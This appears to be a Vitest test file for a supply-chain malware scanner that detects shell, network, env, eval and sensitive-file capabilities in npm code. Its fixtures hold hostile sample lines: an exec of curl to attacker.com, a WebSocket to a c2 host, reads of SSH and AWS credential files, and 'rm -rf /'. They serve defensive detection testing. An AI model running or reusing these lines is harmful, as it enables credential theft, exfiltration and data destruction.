import { describe, expect, it } from 'vitest';
import type { NormalizedFinding } from '@secureship/contracts';
import { AstCapabilityAnalyzer } from '../src/capabilities/ast-capability-analyzer.js';
import { CapabilityMatrix } from '../src/capabilities/capability-matrix.js';
import { SupplyChainReachabilityAnalyzer } from '../src/capabilities/supply-chain-reachability-analyzer.js';
import { ImportGraph } from '../src/graph/import-graph.js';
import type { LockfileGraph } from '../src/lockfile/lockfile-tree-parser.js';

describe('WP4 — AST Capability Extraction & Reachability Correlation', () => {
  describe('AST Capability Detection & Alias Resolution', () => {
    it('detects process.env access in various syntaxes', async () => {
      const code = `
        const apiKey = process.env.SECRET_KEY;
        const dbPass = process.env['DB_PASSWORD'];
        const { AWS_SECRET } = process.env;
        const allKeys = Object.keys(process.env);
        const cloned = { ...process.env };
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/env-reader.ts');
      expect(result.capabilities.hasEnvAccess).toBe(true);
      expect(result.sites.filter((s) => s.capability === 'env').length).toBeGreaterThanOrEqual(3);
    });

    it('resolves shell execution across aliases, destructured imports, and computed properties', async () => {
      const code = `
        const cp = require('child_process');
        cp.exec('whoami');

        const { spawn: runSpawn } = require('node:child_process');
        runSpawn('bash', ['-c', 'id']);

        // Computed property concatenation
        cp['ex' + 'ec']('curl http://attacker.com');

        // Optional chaining
        cp?.execSync?.('ls');
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/shell-user.js');
      expect(result.capabilities.hasShell).toBe(true);
      const shellSites = result.sites.filter((s) => s.capability === 'shell');
      expect(shellSites.length).toBeGreaterThanOrEqual(3);
    });

    it('resolves require re-aliasing (const r = require; r("child_process"))', async () => {
      const code = `
        const r = require;
        const proc = r('child_process');
        proc.execSync('calc.exe');
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/require-alias.js');
      expect(result.capabilities.hasShell).toBe(true);
    });

    it('detects network activity from node modules and global APIs', async () => {
      const code = `
        import https from 'node:https';
        https.get('https://example.com/api', (res) => {});

        async function sendData(data) {
          await fetch('https://telemetry.site/collect', { method: 'POST', body: data });
          new WebSocket('wss://c2.server.com');
        }
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/network-client.ts');
      expect(result.capabilities.hasNetwork).toBe(true);
      const netSites = result.sites.filter((s) => s.capability === 'network');
      expect(netSites.length).toBeGreaterThanOrEqual(3);
    });

    it('detects sensitive filesystem targets and marks dynamic paths with LOW confidence', async () => {
      const code = `
        import fs from 'node:fs';
        import path from 'node:path';

        // Statically resolved sensitive target
        const sshKey = fs.readFileSync('~/.ssh/id_rsa', 'utf8');
        const awsCreds = fs.readFileSync(path.join('/home/user', '.aws', 'credentials'));
        const envFile = fs.readFileSync('.env');

        // Dynamic unresolvable path
        function readUserFile(userInput) {
          return fs.readFileSync(userInput);
        }
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/fs-reader.ts');
      expect(result.capabilities.hasFsSensitive).toBe(true);
      const highSites = result.sites.filter(
        (s) => s.capability === 'fsSensitive' && s.confidence === 'HIGH'
      );
      const lowSites = result.sites.filter(
        (s) => s.capability === 'fsSensitive' && s.confidence === 'LOW'
      );
      expect(highSites.length).toBeGreaterThanOrEqual(2);
      expect(lowSites.length).toBeGreaterThanOrEqual(1);
    });

    it('detects dynamic eval, new Function, VM contexts, and data URI imports', async () => {
      const code = `
        const vm = require('vm');
        eval('console.log("pwned")');
        const fn = new Function('a', 'b', 'return a + b');
        setTimeout('runCode()', 100);
        import('data:text/javascript,console.log("inline")');
        vm.runInThisContext('1 + 1');
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/dynamic-eval.js');
      expect(result.capabilities.hasEval).toBe(true);
      const evalSites = result.sites.filter((s) => s.capability === 'eval');
      expect(evalSites.length).toBeGreaterThanOrEqual(4);
    });

    it('detects dynamic require and low-level module loaders', async () => {
      const code = `
        function loadPlugin(name) {
          return require(name);
        }
        Module._load('some-native-addon');
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/loader.js');
      expect(result.capabilities.hasDynamicRequire).toBe(true);
    });

    it('detects internal Node.js runtime hooks and debugger introspection', async () => {
      const code = `
        process.binding('spawn_sync');
        process.dlopen(module, 'addon.node');
      `;

      const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/internals.js');
      expect(result.capabilities.hasDebugInternals).toBe(true);
    });

    it('falls back to linear token scanner when syntax parsing fails', () => {
      const brokenSyntax = `
        function broken(( {
          process.env.MY_SECRET;
          child_process.execSync("rm -rf /");
      `;

      const fallback = AstCapabilityAnalyzer.fallbackTokenScan(brokenSyntax, 'src/broken.js', true);
      expect(fallback.capabilities.hasEnvAccess).toBe(true);
      expect(fallback.capabilities.hasShell).toBe(true);
      expect(fallback.sites.every((s) => s.confidence === 'LOW')).toBe(true);
    });
  });

  describe('Capability Combination Matrix', () => {
    it('evaluates SC-CAP-100 (Network + Env) as HIGH', () => {
      const capabilities = {
        hasShell: false,
        hasNetwork: true,
        hasEnvAccess: true,
        hasFsSensitive: false,
        hasEval: false,
        hasDynamicRequire: false,
        hasInstallScript: false,
        hasDebugInternals: false,
      };

      const hits = CapabilityMatrix.evaluateCombinations(capabilities, [], {
        packageName: 'stealth-telemetry',
      });

      expect(hits.some((h) => h.ruleId === 'SC-CAP-100' && h.severity === 'HIGH')).toBe(true);
    });

    it('evaluates SC-CAP-101 (Network + Sensitive FS) as CRITICAL & blocking', () => {
      const capabilities = {
        hasShell: false,
        hasNetwork: true,
        hasEnvAccess: false,
        hasFsSensitive: true,
        hasEval: false,
        hasDynamicRequire: false,
        hasInstallScript: false,
        hasDebugInternals: false,
      };

      const hits = CapabilityMatrix.evaluateCombinations(capabilities, [], {
        packageName: 'credential-stealer',
      });

      const sc101 = hits.find((h) => h.ruleId === 'SC-CAP-101');
      expect(sc101).toBeDefined();
      expect(sc101?.severity).toBe('CRITICAL');
      expect(sc101?.blocking).toBe(true);
    });

    it('evaluates SC-CAP-102 (Shell + Network) as HIGH', () => {
      const capabilities = {
        hasShell: true,
        hasNetwork: true,
        hasEnvAccess: false,
        hasFsSensitive: false,
        hasEval: false,
        hasDynamicRequire: false,
        hasInstallScript: false,
        hasDebugInternals: false,
      };

      const hits = CapabilityMatrix.evaluateCombinations(capabilities, [], {
        packageName: 'reverse-shell',
      });

      expect(hits.some((h) => h.ruleId === 'SC-CAP-102' && h.severity === 'HIGH')).toBe(true);
    });

    it('evaluates SC-CAP-104 (Eval + Obfuscation) as CRITICAL & blocking', () => {
      const capabilities = {
        hasShell: false,
        hasNetwork: false,
        hasEnvAccess: false,
        hasFsSensitive: false,
        hasEval: true,
        hasDynamicRequire: false,
        hasInstallScript: false,
        hasDebugInternals: false,
      };

      const hits = CapabilityMatrix.evaluateCombinations(capabilities, [], {
        packageName: 'packed-dropper',
        hasHighEntropyOrObfuscation: true,
      });

      const sc104 = hits.find((h) => h.ruleId === 'SC-CAP-104');
      expect(sc104).toBeDefined();
      expect(sc104?.severity).toBe('CRITICAL');
      expect(sc104?.blocking).toBe(true);
    });

    it('evaluates SC-CAP-106 (Install Script + Sensitive FS) as CRITICAL & NOT reachability-gated', () => {
      const capabilities = {
        hasShell: false,
        hasNetwork: false,
        hasEnvAccess: false,
        hasFsSensitive: true,
        hasEval: false,
        hasDynamicRequire: false,
        hasInstallScript: true,
        hasDebugInternals: false,
      };

      const hits = CapabilityMatrix.evaluateCombinations(capabilities, [], {
        packageName: 'malicious-installer',
        hasInstallScript: true,
      });

      const sc106 = hits.find((h) => h.ruleId === 'SC-CAP-106');
      expect(sc106).toBeDefined();
      expect(sc106?.severity).toBe('CRITICAL');
      expect(sc106?.reachabilityGated).toBe(false);
    });

    it('evaluates lone single capabilities as INFO level diagnostic alerts', () => {
      const capabilities = {
        hasShell: false,
        hasNetwork: true,
        hasEnvAccess: false,
        hasFsSensitive: false,
        hasEval: false,
        hasDynamicRequire: false,
        hasInstallScript: false,
        hasDebugInternals: false,
      };

      const loneHits = CapabilityMatrix.evaluateSingleCapabilities(capabilities, []);
      expect(loneHits).toHaveLength(1);
      expect(loneHits[0]?.ruleId).toBe('SC-CAP-002');
      expect(loneHits[0]?.severity).toBe('INFO');

      // Test all other single capabilities
      const allCaps = {
        hasShell: true,
        hasEnvAccess: true,
        hasFsSensitive: true,
        hasEval: true,
        hasDynamicRequire: true,
        hasInstallScript: true,
        hasDebugInternals: true,
        hasNetwork: false,
      };
      const allHits = CapabilityMatrix.evaluateSingleCapabilities(allCaps, []);
      expect(allHits.map((h) => h.ruleId)).toEqual(
        expect.arrayContaining([
          'SC-CAP-001',
          'SC-CAP-003',
          'SC-CAP-004',
          'SC-CAP-005',
          'SC-CAP-006',
          'SC-CAP-007',
        ])
      );
    });
  });

  describe('Reachability Correlation & Invariant P1 Escalation', () => {
    it('non-gated findings (SC-INSTALL-*, SC-UNI-*, SC-META-003, SC-GOV-*) return NOT_APPLICABLE and are never downgraded', () => {
      const graph = new ImportGraph('/test/repo');
      const fakeFinding: NormalizedFinding = {
        id: 'f-install-1',
        fingerprint: '1'.repeat(64),
        ruleId: 'SC-INSTALL-003',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'CRITICAL',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'package.json', startLine: 1, endLine: 1 },
        title: 'Dangerous Remote Execution in Install Script',
        description: 'curl piped to bash',
        cweIds: [],
        evidence: [
          {
            scannerName: 'generic',
            scannerRuleId: 'SC-INSTALL-003',
            message: 'curl piped to bash',
          },
        ],
        createdAt: new Date().toISOString(),
      };

      const res = SupplyChainReachabilityAnalyzer.analyze(fakeFinding, graph, null, '/test/repo');
      expect(res.scReachability).toBe('NOT_APPLICABLE');
      expect(res.detail.evidence.kind).toBe('NOT_APPLICABLE');
      expect(res.isP1Candidate).toBe(false);
    });

    it('correlates directly imported capability combination to REACHABLE and escalates to P1 candidate', () => {
      const graph = new ImportGraph('/test/repo');
      graph.importedPackages.set('bad-exfil-lib', new Set(['/test/repo/src/index.ts']));

      const fakeFinding: NormalizedFinding = {
        id: 'f-cap-1',
        fingerprint: '2'.repeat(64),
        ruleId: 'SC-CAP-101',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'CRITICAL',
        confidence: 'HIGH',
        package: { name: 'bad-exfil-lib', version: '1.0.0', ecosystem: 'npm' },
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'node_modules/bad-exfil-lib/index.js', startLine: 10, endLine: 10 },
        title: 'Network + Sensitive FS Exfiltration',
        description: 'Exfiltration malware',
        cweIds: [],
        evidence: [
          {
            scannerName: 'generic',
            scannerRuleId: 'SC-CAP-101',
            message: 'Exfiltration malware',
          },
        ],
        createdAt: new Date().toISOString(),
      };

      const res = SupplyChainReachabilityAnalyzer.analyze(fakeFinding, graph, null, '/test/repo');
      expect(res.scReachability).toBe('REACHABLE');
      expect(res.isP1Candidate).toBe(true);
      expect(res.detail.verdict).toBe('REACHABLE_IMPORT');
    });

    it('classifies unimported dependency capabilities as DEP_REACHABLE_ONLY', () => {
      const graph = new ImportGraph('/test/repo');
      graph.importedPackages.set('other-lib', new Set(['/test/repo/src/index.ts']));

      const mockLockfileGraph: LockfileGraph = {
        format: 'NPM_V2_V3',
        nodes: new Map([
          [
            'unused-eval-lib',
            {
              name: 'unused-eval-lib',
              version: '1.0.0',
              isDirect: true,
              isDev: false,
              isOptional: false,
              isPeer: false,
              dependencies: [],
            },
          ],
        ]),
        dependentsMap: new Map(),
        directProdDependencies: new Set(['unused-eval-lib']),
        directDevDependencies: new Set(),
      };

      const fakeFinding: NormalizedFinding = {
        id: 'f-cap-2',
        fingerprint: '3'.repeat(64),
        ruleId: 'SC-CAP-005',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'HIGH',
        confidence: 'HIGH',
        package: { name: 'unused-eval-lib', version: '1.0.0', ecosystem: 'npm' },
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'node_modules/unused-eval-lib/index.js', startLine: 5, endLine: 5 },
        title: 'Dynamic Eval in Unused Dependency',
        description: 'eval() used inside unused package',
        cweIds: [],
        evidence: [
          {
            scannerName: 'generic',
            scannerRuleId: 'SC-CAP-005',
            message: 'eval() used inside unused package',
          },
        ],
        createdAt: new Date().toISOString(),
      };

      const res = SupplyChainReachabilityAnalyzer.analyze(
        fakeFinding,
        graph,
        mockLockfileGraph,
        '/test/repo'
      );
      expect(res.scReachability).toBe('DEP_REACHABLE_ONLY');
      expect(res.isP1Candidate).toBe(false);
      expect(res.detail.verdict).toBe('UNREACHABLE');
    });

    it('correlates transitive dependency pulled in via production dependency', () => {
      const graph = new ImportGraph('/test/repo');
      graph.importedPackages.set('parent-pkg', new Set(['/test/repo/src/index.ts']));

      const mockLockfileGraph: LockfileGraph = {
        format: 'NPM_V2_V3',
        nodes: new Map([
          [
            'parent-pkg',
            {
              name: 'parent-pkg',
              isDirect: true,
              isDev: false,
              isOptional: false,
              isPeer: false,
              dependencies: ['transitive-child'],
            },
          ],
          [
            'transitive-child',
            {
              name: 'transitive-child',
              isDirect: false,
              isDev: false,
              isOptional: false,
              isPeer: false,
              dependencies: [],
            },
          ],
        ]),
        dependentsMap: new Map(),
        directProdDependencies: new Set(['parent-pkg']),
        directDevDependencies: new Set(),
      };

      const finding: NormalizedFinding = {
        id: 'f-trans-1',
        fingerprint: '3'.repeat(64),
        ruleId: 'SC-CAP-100',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'HIGH',
        confidence: 'HIGH',
        package: { name: 'transitive-child', version: '1.0.0', ecosystem: 'npm' },
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'node_modules/transitive-child/index.js', startLine: 1, endLine: 1 },
        title: 'Shell Execution + Dynamic Eval',
        description: 'Transitive dangerous combination',
        cweIds: [],
        evidence: [],
        createdAt: new Date().toISOString(),
      };

      const res = SupplyChainReachabilityAnalyzer.analyze(
        finding,
        graph,
        mockLockfileGraph,
        '/test/repo'
      );
      expect(res.scReachability).toBe('REACHABLE');
      expect(res.isP1Candidate).toBe(true);
      expect(res.detail.verdict).toBe('REACHABLE_IMPORT');
      expect(res.detail.evidence.kind).toBe('TRANSITIVE_VIA');
    });

    it('handles missing lockfile tree with entrypoints as NO_LOCKFILE_TREE', () => {
      const graph = new ImportGraph('/test/repo');
      graph.entrypoints = ['/test/repo/src/index.ts'];

      const finding: NormalizedFinding = {
        id: 'f-trans-2',
        fingerprint: '4'.repeat(64),
        ruleId: 'SC-CAP-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'MEDIUM',
        confidence: 'MEDIUM',
        package: { name: 'unlocked-lib', version: '1.0.0', ecosystem: 'npm' },
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'node_modules/unlocked-lib/index.js', startLine: 1, endLine: 1 },
        title: 'Shell Execution',
        description: 'Shell execution',
        cweIds: [],
        evidence: [],
        createdAt: new Date().toISOString(),
      };

      const res = SupplyChainReachabilityAnalyzer.analyze(finding, graph, null, '/test/repo');
      expect(res.scReachability).toBe('UNKNOWN');
      expect(res.detail.verdict).toBe('UNKNOWN');
      expect(res.detail.evidence.kind).toBe('NO_LOCKFILE_TREE');
    });

    it('handles remaining analyzer edge cases: missing package, direct/transitive non-dangerous combos, no entrypoints', () => {
      const graph = new ImportGraph('/test/repo');

      // 1. Missing package name
      const noPkgFinding: NormalizedFinding = {
        id: 'f-nopkg',
        fingerprint: '5'.repeat(64),
        ruleId: 'SC-CAP-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'MEDIUM',
        confidence: 'MEDIUM',
        reachability: 'UNKNOWN',
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        location: { filePath: 'index.js', startLine: 1, endLine: 1 },
        title: 'No Package',
        description: 'No Package',
        cweIds: [],
        evidence: [],
        createdAt: new Date().toISOString(),
      };
      const resNoPkg = SupplyChainReachabilityAnalyzer.analyze(
        noPkgFinding,
        graph,
        null,
        '/test/repo'
      );
      expect(resNoPkg.detail.evidence.kind).toBe('UNMAPPED_PACKAGE');

      // 2. Direct import non-dangerous combo (ruleId SC-CAP-001, severity MEDIUM)
      graph.importedPackages.set('safe-shell-pkg', new Set());
      const safeDirectFinding: NormalizedFinding = {
        ...noPkgFinding,
        ruleId: 'SC-CAP-001',
        severity: 'MEDIUM',
        package: { name: 'safe-shell-pkg', version: '1.0.0', ecosystem: 'npm' },
      };
      const resSafeDirect = SupplyChainReachabilityAnalyzer.analyze(
        safeDirectFinding,
        graph,
        null,
        '/test/repo'
      );
      expect(resSafeDirect.scReachability).toBe('REACHABLE');
      expect(resSafeDirect.isP1Candidate).toBe(false);

      // 3. Transitive non-dangerous combo
      const mockLockfileGraph: LockfileGraph = {
        format: 'NPM_V2_V3',
        nodes: new Map([
          [
            'parent-pkg',
            {
              name: 'parent-pkg',
              isDirect: true,
              isDev: false,
              isOptional: false,
              isPeer: false,
              dependencies: ['transitive-safe'],
            },
          ],
          [
            'transitive-safe',
            {
              name: 'transitive-safe',
              isDirect: false,
              isDev: false,
              isOptional: false,
              isPeer: false,
              dependencies: [],
            },
          ],
        ]),
        dependentsMap: new Map(),
        directProdDependencies: new Set(['parent-pkg']),
        directDevDependencies: new Set(),
      };
      graph.importedPackages.set('parent-pkg', new Set(['/test/repo/src/index.ts']));
      const safeTransFinding: NormalizedFinding = {
        ...noPkgFinding,
        ruleId: 'SC-CAP-001',
        severity: 'MEDIUM',
        package: { name: 'transitive-safe', version: '1.0.0', ecosystem: 'npm' },
      };
      const resSafeTrans = SupplyChainReachabilityAnalyzer.analyze(
        safeTransFinding,
        graph,
        mockLockfileGraph,
        '/test/repo'
      );
      expect(resSafeTrans.scReachability).toBe('REACHABLE');
      expect(resSafeTrans.isP1Candidate).toBe(false);

      // 4. No entrypoints and no lockfile
      const resNoEntrypoints = SupplyChainReachabilityAnalyzer.analyze(
        safeTransFinding,
        new ImportGraph('/test/repo'),
        null,
        '/test/repo'
      );
      expect(resNoEntrypoints.detail.evidence.kind).toBe('NO_ENTRYPOINT');
    });
  });
});
